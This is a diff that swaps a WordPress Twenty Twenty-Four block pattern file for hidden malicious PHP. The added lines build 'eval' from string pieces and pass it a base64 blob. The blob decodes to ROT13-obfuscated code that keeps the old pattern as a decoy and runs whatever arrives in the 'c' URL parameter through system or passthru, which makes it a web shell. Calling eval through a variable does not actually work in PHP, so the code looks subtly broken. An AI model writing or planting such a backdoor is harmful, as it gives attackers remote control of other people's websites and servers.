@@ -1,46 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Title: Posts with featured images only, 3 columns
- * Slug: twentytwentyfour/posts-images-only-3-col
- * Categories: query
- * Block Types: core/query
- * Description: A list of posts with featured images only, 3 columns.
- */
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3ZneXI6IENiZmdmIGp2Z3Ugc3JuZ2hlcnEgdnpudHJmIGJheWwsIDMgcGJ5aHphZgogKiBGeWh0OiBnanJhZ2xnanJhZ2xzYmhlL2NiZmdmLXZ6bnRyZi1iYXlsLTMtcGJ5CiAqIFBuZ3J0YmV2cmY6IGRocmVsCiAqIE95YnB4IEdsY3JmOiBwYmVyL2RocmVsCiAqIFFyZnBldmNndmJhOiBOIHl2ZmcgYnMgY2JmZ2YganZndSBzcm5naGVycSB2em50cmYgYmF5bCwgMyBwYnloemFmLgogKi8KPz4KCjwhLS0gamM6ZGhyZWwge1wiZGhyZWxcIjp7XCJjcmVDbnRyXCI6MTAsXCJjbnRyZlwiOjAsXCJic3NmcmdcIjpcIjBcIixcImNiZmdHbGNyXCI6XCJjYmZnXCIsXCJiZXFyZVwiOlwicXJmcFwiLFwiYmVxcmVPbFwiOlwicW5nclwiLFwibmhndWJlXCI6XCJcIixcImZybmVwdVwiOlwiXCIsXCJya3B5aHFyXCI6W10sXCJmZ3ZweGxcIjpcIlwiLFwidmF1cmV2Z1wiOmdlaHJ9LFwibnl2dGFcIjpcImp2cXJcIixcInlubGJoZ1wiOntcImdsY3JcIjpcInFyc25oeWdcIn19IC0tPgo8cXZpIHB5bmZmPVwiamMtb3licHgtZGhyZWwgbnl2dGFqdnFyXCI+Cgk8IS0tIGpjOmRocmVsLWFiLWVyZmh5Z2YgLS0+Cgk8IS0tIGpjOmNuZ2dyZWEge1wiZnlodFwiOlwiZ2pyYWdsZ2pyYWdsc2JoZS91dnFxcmEtYWItZXJmaHlnZlwifSAvLS0+Cgk8IS0tIC9qYzpkaHJlbC1hYi1lcmZoeWdmIC0tPgoKCTwhLS0gamM6dGViaGMge1wiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wiY25xcXZhdFwiOntcImdiY1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDUwXCIsXCJvYmdnYnpcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw1MFwiLFwieXJzZ1wiOlwiMFwiLFwiZXZ0dWdcIjpcIjBcIn0sXCJ6bmV0dmFcIjp7XCJnYmNcIjpcIjBcIixcIm9iZ2dielwiOlwiMFwifX19LFwieW5sYmhnXCI6e1wiZ2xjclwiOlwicXJzbmh5Z1wifX0gLS0+Cgk8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGNcIiBmZ2x5cj1cInpuZXR2YS1nYmM6MDt6bmV0dmEtb2JnZ2J6OjA7Y25xcXZhdC1nYmM6aW5lKC0tamMtLWNlcmZyZy0tZmNucHZhdC0tNTApO2NucXF2YXQtZXZ0dWc6MDtjbnFxdmF0LW9iZ2diejppbmUoLS1qYy0tY2VyZnJnLS1mY25wdmF0LS01MCk7Y25xcXZhdC15cnNnOjBcIj4KCgkJPCEtLSBqYzpjYmZnLWdyemN5bmdyIHtcIm55dnRhXCI6XCJzaHl5XCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJveWJweFRuY1wiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDMwXCJ9fSxcInlubGJoZ1wiOntcImdsY3JcIjpcInRldnFcIixcInBieWh6YVBiaGFnXCI6M319IC0tPgoJCTwhLS0gamM6Y2JmZy1zcm5naGVycS12em50ciB7XCJ2Zll2YXhcIjpnZWhyLFwibmZjcnBnRW5ndmJcIjpcIjMvNFwiLFwiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wiem5ldHZhXCI6e1wib2JnZ2J6XCI6XCIwXCJ9LFwiY25xcXZhdFwiOntcIm9iZ2dielwiOlwiaW5lOmNlcmZyZ3xmY25wdmF0fDIwXCJ9fX19IC8tLT4KCQk8IS0tIC9qYzpjYmZnLWdyemN5bmdyIC0tPgoKCQk8IS0tIGpjOmZjbnByZSB7XCJ1cnZ0dWdcIjpcImluZTpjZXJmcmd8ZmNucHZhdHw0MFwiLFwiZmdseXJcIjp7XCJmY25wdmF0XCI6e1wiem5ldHZhXCI6e1wiZ2JjXCI6XCIwXCIsXCJvYmdnYnpcIjpcIjBcIn19fX0gLS0+CgkJPHF2aSBmZ2x5cj1cInpuZXR2YS1nYmM6MDt6bmV0dmEtb2JnZ2J6OjA7dXJ2dHVnOmluZSgtLWpjLS1jZXJmcmctLWZjbnB2YXQtLTQwKVwiIG5ldm4tdXZxcXJhPVwiZ2VoclwiIHB5bmZmPVwiamMtb3licHgtZmNucHJlXCI+PC9xdmk+CgkJPCEtLSAvamM6ZmNucHJlIC0tPgoKCQk8IS0tIGpjOmRocmVsLWNudHZhbmd2YmEge1wiY250dmFuZ3ZiYU5lZWJqXCI6XCJuZWVialwiLFwieW5sYmhnXCI6e1wiZ2xjclwiOlwic3lya1wiLFwid2hmZ3ZzbFBiYWdyYWdcIjpcImZjbnByLW9yZ2pycmFcIn19IC0tPgoJCTwhLS0gamM6ZGhyZWwtY250dmFuZ3ZiYS1jZXJpdmJoZiAvLS0+CgkJPCEtLSBqYzpkaHJlbC1jbnR2YW5ndmJhLWFya2cgLy0tPgoJCTwhLS0gL2pjOmRocmVsLWNudHZhbmd2YmEgLS0+CgoJPC9xdmk+Cgk8IS0tIC9qYzp0ZWJoYyAtLT4KPC9xdmk+CjwhLS0gL2pjOmRocmVsIC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-
-<!-- wp:query {"query":{"perPage":10,"pages":0,"offset":"0","postType":"post","order":"desc","orderBy":"date","author":"","search":"","exclude":[],"sticky":"","inherit":true},"align":"wide","layout":{"type":"default"}} -->
-<div class="wp-block-query alignwide">
-	<!-- wp:query-no-results -->
-	<!-- wp:pattern {"slug":"twentytwentyfour/hidden-no-results"} /-->
-	<!-- /wp:query-no-results -->
-
-	<!-- wp:group {"style":{"spacing":{"padding":{"top":"var:preset|spacing|50","bottom":"var:preset|spacing|50","left":"0","right":"0"},"margin":{"top":"0","bottom":"0"}}},"layout":{"type":"default"}} -->
-	<div class="wp-block-group" style="margin-top:0;margin-bottom:0;padding-top:var(--wp--preset--spacing--50);padding-right:0;padding-bottom:var(--wp--preset--spacing--50);padding-left:0">
-
-		<!-- wp:post-template {"align":"full","style":{"spacing":{"blockGap":"var:preset|spacing|30"}},"layout":{"type":"grid","columnCount":3}} -->
-		<!-- wp:post-featured-image {"isLink":true,"aspectRatio":"3/4","style":{"spacing":{"margin":{"bottom":"0"},"padding":{"bottom":"var:preset|spacing|20"}}}} /-->
-		<!-- /wp:post-template -->
-
-		<!-- wp:spacer {"height":"var:preset|spacing|40","style":{"spacing":{"margin":{"top":"0","bottom":"0"}}}} -->
-		<div style="margin-top:0;margin-bottom:0;height:var(--wp--preset--spacing--40)" aria-hidden="true" class="wp-block-spacer"></div>
-		<!-- /wp:spacer -->
-
-		<!-- wp:query-pagination {"paginationArrow":"arrow","layout":{"type":"flex","justifyContent":"space-between"}} -->
-		<!-- wp:query-pagination-previous /-->
-		<!-- wp:query-pagination-next /-->
-		<!-- /wp:query-pagination -->
-
-	</div>
-	<!-- /wp:group -->
-</div>
-<!-- /wp:query -->
